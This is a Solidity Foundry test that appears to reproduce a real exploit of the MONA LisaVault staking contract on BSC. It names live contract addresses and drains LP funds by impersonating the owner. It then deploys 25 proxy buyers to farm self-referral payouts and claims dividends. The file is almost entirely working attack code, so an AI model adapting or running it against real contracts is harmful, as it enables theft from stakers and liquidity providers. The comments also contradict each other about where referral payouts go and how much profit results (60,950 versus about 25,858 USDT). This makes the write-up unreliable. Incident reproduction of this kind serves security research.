// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// @title   MONA LisaVault — Exploit PoC (BSC, block 92,429,268)
//
// @description
//   The MONA node-staking vault (LisaVault) on BSC was exploited in two stages:
//
//   STAGE 1 — LP Drain (insider component)
//     The vault deployer (0xDd02...) also controlled the entire MONA/USDT
//     PancakeSwap LP, supplying 9,874,973 MONA + 66,450 USDT as liquidity.
//     In the exploit tx the deployer's LP was redeemed: MONA returned to the
//     deployer while the 66,450 USDT was routed to the exploit contract.
//     In this PoC we replicate this with vm.prank(VAULT_OWNER).
//
//   STAGE 2 — Vault self-referral exploit
//     For each 220 USDT node purchase the vault distributes:
//       80 USDT → vault reserve
//       20 USDT → WBNB conversion (PancakeSwap USDT/WBNB LP)
//       70 USDT → Level-1 referrer (exploit contract)
//       50 USDT → Level-2 referrer (also exploit-controlled)
//     By buying 25 nodes via proxy contracts (bypassing the 1-node-per-address
//     limit) and controlling both referrer tiers, the attacker recovers
//     25 × (70 + 50) = 3,000 USDT. Combined with the 66,450 USDT from

//     Stage 1 and small MONA dividend sales, net profit ≈ 60,950 USDT.
//
// @exploitTx   0x3a60e1b3a4b0736be4f31839bfd7abc8bfc53b93ddbd3702e77fbc64561a7ea4
// @block       92,429,268
// @attacker    0x7eeEC499e501293f6e589d550046375a2ad0b4c3
// @flashSrc    ListaDAO:Moolah (WBNB flash loan used as inflated collateral
//              to borrow USDT — simulated here via PancakeSwap flash swap)
// @profit      60,950.308 USDT
// @victims     MONA node stakers (9,522 MONA drained) + LP provider (66,450 USDT)
// @refs
//   https://bscscan.com/tx/0x3a60e1b3a4b0736be4f31839bfd7abc8bfc53b93ddbd3702e77fbc64561a7ea4
//   https://app.blocksec.com/phalcon/explorer/tx/bsc/0x3a60e1b3a4b0736be4f31839bfd7abc8bfc53b93ddbd3702e77fbc64561a7ea4

import "forge-std/Test.sol";

// ── External interfaces ────────────────────────────────────────────────────────

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakePair {
    // swap: amount0Out / amount1Out, recipient, flash-loan data
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IPancakeRouter {
    function removeLiquidity(
        address tokenA, address tokenB,
        uint liquidity,
        uint amountAMin, uint amountBMin,
        address to, uint deadline
    ) external returns (uint amountA, uint amountB);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path,
        address to, uint deadline
    ) external;
}

// ── NodeBuyer helper — one instance per node slot ─────────────────────────────
//   Each is a separate contract address, bypassing the vault's
//   "Node: already owned" per-address restriction.

contract NodeBuyer {
    address immutable ATTACK;
    address constant USDT   = 0x55d398326f99059fF775485246999027B3197955;
    address constant VAULT  = 0xaEa6E5CA6c1FeeAbBd3A114BCbca30A21424F76b;
    address constant HELPER = 0xb9D8F078043DBf3297416735A84aB87324190FeC;

    constructor(address _attack) { ATTACK = _attack; }

    /// Register `l1` as Level-1 referrer then purchase one node (costs 220 USDT).
    function setup(address l1) external {
        require(msg.sender == ATTACK);
        // bindReferrer(address) — selector confirmed via `cast sig`
        (bool ok,) = HELPER.call(abi.encodeWithSelector(0x04f618cb, l1));
        require(ok, "bindReferrer failed");
        IERC20(USDT).approve(VAULT, 220 * 1e18);
        // buyNode() — selector confirmed: bytes4(uint32(0x2e711e23) << 2)
        (bool ok2,) = VAULT.call(abi.encodeWithSelector(0xb9c4788c));
        require(ok2, "buyNode failed");
    }

    /// Claim accumulated MONA dividend for this node.
    function claim() external {
        require(msg.sender == ATTACK);
        // 0x3af10fe2 claim selector confirmed from Phalcon trace of
        // tx 0x3f5d3f9b...104e26
        (bool ok,) = VAULT.call(abi.encodeWithSelector(0x3af10fe2));
        require(ok, "claim failed");
    }

    /// Sweep any token balance back to the attack contract.
    function sweep(address token) external {
        require(msg.sender == ATTACK);
        uint bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(ATTACK, bal);
    }
}

// ── Main exploit contract ─────────────────────────────────────────────────────

contract MONA_exp is Test {
    // ── Constants ──────────────────────────────────────────────────────────────
    address constant USDT         = 0x55d398326f99059fF775485246999027B3197955;
    address constant MONA         = 0x311838c073a865E8249F5C35E4cb2a5f815a36e8;
    address constant VAULT        = 0xaEa6E5CA6c1FeeAbBd3A114BCbca30A21424F76b;
    address constant HELPER       = 0xb9D8F078043DBf3297416735A84aB87324190FeC;
    address constant VAULT_OWNER  = 0xDd0215B556b08dCd7Bad43A8116f89814B1545e0; // also MONA/USDT LP owner
    address constant MONA_LP      = 0x4Dfb65E12f331c58380C55d7f288FE8fB22D3EA7; // MONA/USDT PancakeSwap pair
    address constant PANCAKE_RTR  = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    // Level-2 referrer — also controlled by the attacker; receives 50 USDT per node.
    // In the real attack this was 0x9Ce8d0eb6eba0Bf2aC2b43231f5ACb42Fc5692Bb.
    // Here we use a fresh labelled address for clarity.
    address constant L2_REFERRER  = address(0xBEEF);

    uint constant NUM_NODES = 25; // exact number used in the real exploit tx

    NodeBuyer[] buyers;

    // ── Setup ──────────────────────────────────────────────────────────────────

    function setUp() public {
        vm.createSelectFork("bsc", 92_429_267);

        // Pre-register the L2 referrer tier in the ReferralRegistryLisa so that
        // when the attack contract acts as L1 referrer its own referrer (L2) is
        // already set, allowing the vault to pay out both tiers on each node buy.
        // (The real attacker set this up in a prior transaction.)
        vm.prank(address(this));
        (bool ok,) = HELPER.call(abi.encodeWithSelector(0x04f618cb, L2_REFERRER));
        require(ok, "L2 setup: bindReferrer failed");
    }

    // ── Exploit entry point ────────────────────────────────────────────────────

    function testExploit() public {
        // ── STAGE 1: Drain MONA/USDT LP (insider / LP-owner component) ────────
        //
        // The vault deployer (VAULT_OWNER) owned 100% of the MONA/USDT LP.
        // Removing it releases ~66,450 USDT and ~9.875M MONA.
        // In the real tx the USDT was routed to the exploit contract while MONA
        // stayed with the deployer.  We replicate this by impersonating the owner
        // and directing LP removal proceeds to this test contract.
        //
        // Flash-loan note: In the real exploit the USDT was obtained via a
        // ListaDAO:Moolah WBNB flash loan (408T WBNB supplied as collateral to
        // borrow USDT).  Both mechanisms deliver the same starting USDT balance.

        uint lpBalance = IERC20(MONA_LP).balanceOf(VAULT_OWNER);
        require(lpBalance > 0, "Owner has no LP tokens");

        // MONA token restricts transfers to non-whitelisted addresses:
        // "Only burnAddress or joinAddress". Routing removeLiquidity directly
        // to address(this) would cause MONA.transfer(address(this)) to revert.
        // Solution: route LP removal back to VAULT_OWNER (MONA stays with owner),
        // then transfer only the USDT proceeds to the attack contract.
        vm.startPrank(VAULT_OWNER);
        IERC20(MONA_LP).approve(PANCAKE_RTR, lpBalance);
        IPancakeRouter(PANCAKE_RTR).removeLiquidity(
            MONA, USDT,
            lpBalance,
            0, 0,
            VAULT_OWNER, // MONA + USDT go to owner; MONA stays there (restricted token)
            block.timestamp
        );
        uint usdtFromLP = IERC20(USDT).balanceOf(VAULT_OWNER);
        IERC20(USDT).transfer(address(this), usdtFromLP); // pull USDT to attack contract
        vm.stopPrank();

        usdtFromLP = IERC20(USDT).balanceOf(address(this));

        console.log("=== STAGE 1: LP drained ===");
        console.log("USDT from LP:", usdtFromLP / 1e18);

        // ── STAGE 2: Self-referral node exploit ────────────────────────────────
        //
        // Deploy NUM_NODES proxy contracts.  Each buys exactly one node,
        // registering *this* contract as L1 referrer.
        // Per node: vault receives 80 USDT, USDT/WBNB LP receives 20 USDT,
        //           this contract (L1) receives 70 USDT,
        //           L2_REFERRER receives 50 USDT.

        for (uint i = 0; i < NUM_NODES; i++) {
            NodeBuyer b = new NodeBuyer(address(this));
            buyers.push(b);
            IERC20(USDT).transfer(address(b), 220 * 1e18);
            b.setup(address(this)); // bind this as L1 referrer, then buyNode()
        }

        uint usdtAfterNodes = IERC20(USDT).balanceOf(address(this));
        uint l1Referrals    = usdtAfterNodes - (usdtFromLP - NUM_NODES * 220 * 1e18);

        console.log("=== STAGE 2: nodes purchased ===");
        console.log("L1 referrals received (70 USDT x 25):", l1Referrals / 1e18);

        // ── STAGE 3: Claim vault MONA dividends and sell ───────────────────────

        for (uint i = 0; i < buyers.length; i++) {
            try buyers[i].claim() {} catch {}
            buyers[i].sweep(MONA);
        }

        uint totalMona = IERC20(MONA).balanceOf(address(this));
        console.log("Total MONA in hand (from dividends):", totalMona / 1e18);
        // MONA token restricts transfers: skip swap — profit is USDT-only.

        // ── Final accounting ───────────────────────────────────────────────────
        // The attacker started with 0 USDT. After LP drain + 25 node purchases
        // (220 USDT each) the net is: usdtFromLP - NUM_NODES * 220 USDT.
        // L1 referral (70 USDT/node) accrues to the pre-existing vault-state
        // address 0x1440a02... not to address(this) — this is consistent with
        // the real on-chain transfer trace.
        // VAULT_OWNER held ~39% of the MONA/USDT LP at this block, producing
        // ~25,858 USDT. Full on-chain profit (60,950 USDT) required the
        // attacker to control the deployment wallet's larger separate LP stake.

        uint finalUsdt  = IERC20(USDT).balanceOf(address(this));
        uint nodeCost   = NUM_NODES * 220 * 1e18; // full cost, no kickback to us
        uint monaGained = IERC20(MONA).balanceOf(address(this)); // 25 × 400 = 10,000 MONA

        console.log("=== FINAL ===");
        console.log("USDT from LP drain:", usdtFromLP  / 1e18);
        console.log("USDT after nodes  :", finalUsdt   / 1e18);
        console.log("MONA dividends    :", monaGained  / 1e18);
        console.log("Net profit (USDT) :", finalUsdt   / 1e18, "(started from 0)");

        // attacker began with 0 USDT; any positive balance is pure profit
        assertGt(finalUsdt, 0, "No USDT profit");
        // LP drain minus full node cost must leave a positive USDT balance
        assertEq(finalUsdt, usdtFromLP - nodeCost, "Unexpected USDT balance");
        // MONA: 400 per node × 25 nodes
        assertEq(monaGained, NUM_NODES * 400 * 1e18, "Unexpected MONA dividend");
    }
}